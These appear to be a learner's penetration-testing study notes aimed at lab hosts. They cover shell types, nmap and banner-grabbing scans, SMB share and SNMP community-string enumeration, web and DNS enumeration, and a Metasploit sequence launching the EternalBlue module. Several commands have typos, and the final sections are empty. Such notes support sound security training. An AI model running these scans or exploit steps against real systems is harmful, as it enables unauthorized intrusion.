***

### Risk Management Process

- Identify the risk
- Analyze the risk
- Evaluate the risk
- Dealing with the risk
- Monitoring Risk 

### Common Terms

- **Reverse Shell:** Initiates a connection back to a "Listener" on our attack box
- **Bind Shell:** "Binds" to a specific port on the target host and waits for a connection from our attack box.
- **Web Shell:** Runs OS commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e. leveraging a file upload vulnerability and uploading a PHP script to run a single command)

### Basic Tools

- **[Reverse Shell](https://github.com/besimorhino/powercat):** Windows alternative to `netcat` coded in PowerShell called **PowerCat**
- **[Socat](https://linux.die.net/man/1/socat):** It has a few features that `natcat` does not support, like forwarding ports and connecting to serial devices.
	- It can also be used to [upgrade a shell to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat) 
	- [Standalone Binary](https://github.com/andrew-d/static-binaries) of `Socat` can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.

### Service Scanning

- Port 0 is a reserved port and is "Wild Card" port
- Ports 1 - 1023 are reserved for privileged services
- `nmap 10.129.42.254` by default performs a TCP scan
	- `-sC`: nmap scripts will be used to obtain more detailed information
	- `-sV`: Performs a version scan (service protocol, application name, version)
	- `-p-`: Scan all ports
- **Banner Grabbing**
	- `namp -sV --script=banner <target>`
	- `nmap -sV --script=banner -p21 10.10.10.0/24`
	- ``nc -nv 10.129.42.253 21``
- **FTP**
	- `ftp -p 10.129.42.253`
- **SMB**
	- `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
	- `nmap -A -p445 10.129.42.253`
	- **Shares**
		- `smbclient -N -L \\\\10.129.42.253`
			- `-N`: Suppress the password prompt
			- `-L`: List the available shares on the remote host
		- `smbclient \\\\10.129.42.253\\users`
		- `smbclient -U bob \\\\10.129.42.253\\users`
- **SNMP**
	- Community strings provide information and statistics about router or device.
	- The manufacturer default community strings of `public` and `private` are often unchanged.
	- `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`
	- `snmpwalk -v 2c -c private 10.129.42.253`
	- [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of community strings such as the `dict.txt` file.
		- `onesixtyone -c dict.txt 10.129.42.254`

### Web Enumeration

- [ffuf](https://github.com/ffuf/ffuf) and [GoBuster](https://github.com/OJ/gobuster) can be used for directory enumeration
	- `gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
- **DNS Subdomain Enumeration**
	- `git clone https://github.com/danielmiessler/SecLists`
	- `sudo apt install seclists -y`
	- Next add a DNS server such a `1.1.1.1` to the `/etc/resolv.conf`
	- `gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.txt`
- We can user `cURL` to retrieve server header information
	- `curl -IL https://www.inlanefreight.com`
- [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
- `whatweb <target ip>` can be used to extract the version of web servers, supporting frameworks, and applications.
	- `whatweb --no-errors <target ip>`

### Public Exploits

- The `searchsploit` tool can be used to search for public vulnerabilities/exploits for any application.
	- `sudo apt install exploitdb -y`
	- `searchspolit openssh 7.2` 
	- We can also use the online exploit database to search for vulnerabilities:
		- [Exploit DB](https://www.exploit-db.com/)
		- [Rapid7 DB](https://www.rapid7.com/db/)
		- [Vulnerability Lab](https://www.vulnerability-lab.com/)
	- We can also use `metasploit` to search for exploits and use the exploits against vulnerable targets.
		- `msfconsole`
		- `search exploit eternalblue`
		- `use exploit/windows/smb/ms17_010_psexec`
		- `show options`
		- `set LHOST tun0`
		- `set RHOST 10.10.10.10`
		- `check`: can be used to check if the server is vulnerable
		- `run` or `exploit`

### Types Of Shells

### Privilege Escalation

### Transferring Files
